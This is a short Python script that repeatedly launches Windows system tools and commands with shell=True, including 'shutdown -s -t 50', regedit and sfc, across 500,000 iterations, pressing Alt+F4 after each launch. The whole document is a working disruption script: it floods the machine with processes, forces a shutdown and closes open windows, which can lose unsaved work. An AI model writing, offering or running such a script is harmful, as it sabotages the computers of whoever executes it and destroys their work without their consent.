import os
import subprocess
import pyautogui as gui

commands = {'msconfig', 
            'cmd', 
            'calc', 
            'notepad', 
            'shutdown -s -t 50',
            'ping', 
            'ipconfig',
            'control',
            'regedit',
            'sfc /SCANNOW',
            'netstat'
            }


for execution in range(500000):
    for comando in commands:
        subprocess.Popen(comando, shell=True)
        gui.hotkey(('alt', 'f4'))